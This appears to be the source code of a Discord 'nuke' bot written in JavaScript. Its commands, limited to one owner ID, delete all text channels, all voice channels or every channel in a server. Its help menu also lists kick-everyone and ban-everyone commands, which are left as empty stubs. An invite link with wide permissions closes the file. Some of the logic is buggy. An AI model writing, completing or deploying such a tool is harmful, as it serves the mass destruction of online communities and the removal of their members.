//install discord.js, chalk, and dotenv via npm for this to work
const Discord = require('discord.js');
const chalk = require('chalk');
const client = new Discord.Client();
const prefix = '|';
const fs = require('fs');
const { bgGray, bgGreen } = require('chalk');
require("dotenv").config();

client.once('ready', () => {
    console.log(chalk.bgGreen.black(`[info] Logged in as ${client.user.tag}`));
    console.log(chalk.bgWhite.black('[info] "|" is the prefix'));
    console.log(chalk.bgYellowBright.black('[alert] If you get a DiscordAPIError then it\'s completely fine. Just restart the bot.'));
});

client.on('message', message => {
    if(!message.content.startsWith(prefix) || message.author.bot) return;
    const args = message.content.slice(prefix.length).split(/ +/);
    const command = args.shift().toLowerCase();
    if(command === 'help'){
        try{
            const helpEmbed = new Discord.MessageEmbed()
            .setColor('#1c5fa6')
            .setTitle('**:information_source:   All Commands**')
            .addFields(
                {name: 'tchannels', value: 'deletes all **text** channels', inline: false},
                {name: 'vchannels', value: 'deletes all **voice** channels', inline: false},
                {name: 'achannels', value: 'deletes **all** channels', inline: false},
                {name: 'akchannels', value: 'deletes all channels and **kicks** everyone', inline: false},
                {name: 'abchannels', value: 'deletes all channels and **bans** everyone', inline: false},
            )
            .setTimestamp();
            message.channel.send(helpEmbed); 
        } catch{
            console.log(chalk.bold.bgRed(`Failed to send a help embed.`));
        }
    } else if (command == 'tchannels'){
        if(message.author.id === process.env.uid) {
            //1
            try{
                message.guild.channels.cache.filter((c) => c.type === "text").forEach(channel => channel.delete());
                console.log(chalk.bgGreen.black('[success] Deleted all text channels successfully!'));
                //2
                return
                //3
            } catch (error) {
                const tchannelsErrEmbed = new Discord.MessageEmbed()
                .setColor('#a61c1c')
                .setTitle(':x:  Uh-Oh! Something went wrong')
                .setDescription(error)
                message.channel.send(tchannelsErrEmbed);
                console.log(chalk.bold.bgRed(`Uh-Oh! Something went wrong`));
                console.log(chalk.bold.bgRed('Error: ' + error));
            }
        } else {
            const noIdEmbed = new Discord.MessageEmbed()
            .setColor('#a61c1c')
            .setTitle(`:x:  You are not authorized to run that command. @${message.author.username}`)
            message.channel.send(noIdEmbed);
        }
    } else if (command == 'vchannels') {
        if(message.author.id === process.env.uid) {
            const vchannelsEmbed = new Discord.MessageEmbed()
            .setColor('#1c5fa6')
            .setTitle(':information_source:   Attempting to delete all voice channels') 
            message.channel.send(vchannelsEmbed);
            try{
                message.guild.channels.cache.forEach((channel) => {
                    message.guild.channels.cache.filter((c) => c.type === "voice").forEach(channel => channel.delete());
                    console.log(chalk.bgGreen.black('[success] Deleted a voice channels successfully!'));
                        const vchannelsDelEmbed = new Discord.MessageEmbed()
                        .setColor('#3fa61c')
                        .setTitle(':white_check_mark:  Deleted all voice channels successfully') 
                        message.channel.send(vchannelsDelEmbed);
                    return
                    //4
                });
            } catch (error) {
                const vchannelsErrEmbed = new Discord.MessageEmbed()
                .setColor('#a61c1c')
                .setTitle(':x:  Uh-Oh! Something went wrong')
                .setDescription(error)
                message.channel.send(vchannelsErrEmbed);
                console.log(chalk.bold.bgRed(`Failed to delete all voice channels.`));
            }
        } else {
            const noIdEmbed = new Discord.MessageEmbed()
            .setColor('#a61c1c')
            .setTitle(`:x:  You are not authorized to run that command. @${message.author.username}`)
            message.channel.send(noIdEmbed);
        } 
    } else if (command == 'achannels') {
        if(message.author.id === process.env.uid) {
            try{
                message.guild.channels.cache.forEach((channel  => channel.delete()));
                if (!message.guild.channels.filter((c) => c.type === "text" || c.type === "voice").size === 0){
                    console.log(chalk.bgGreen('All channels have been deleted.'))
                    return;
                }
            } catch (error){
                console.log(chalk.bold.bgRed(`Failed to delete all channels.`));
            }
        } else {
            const noIdEmbed = new Discord.MessageEmbed()
            .setColor('#a61c1c')
            .setTitle(`:x:  You are not authorized to run that command. @${message.author.username}`)
            message.channel.send(noIdEmbed);
        }
    } else if (command == 'akchannels') {
        if(message.author.id === process.env.uid) {
            // code here
        } else {
            const noIdEmbed = new Discord.MessageEmbed()
            .setColor('#a61c1c')
            .setTitle(`:x:  You are not authorized to run that command. @${message.author.username}`)
            message.channel.send(noIdEmbed);
        }
    } else if (command == 'abchannels') {
        if(message.author.id === process.env.uid) {
            // code here
        } else {
            const noIdEmbed = new Discord.MessageEmbed()
            .setColor('#a61c1c')
            .setTitle(`:x:  You are not authorized to run that command. @${message.author.username}`)
            message.channel.send(noIdEmbed);
        }
    }
});
client.login(process.env.token);
//https://discord.com/oauth2/authorize?client_id=832436291005186098&scope=bot&permissions=805448830
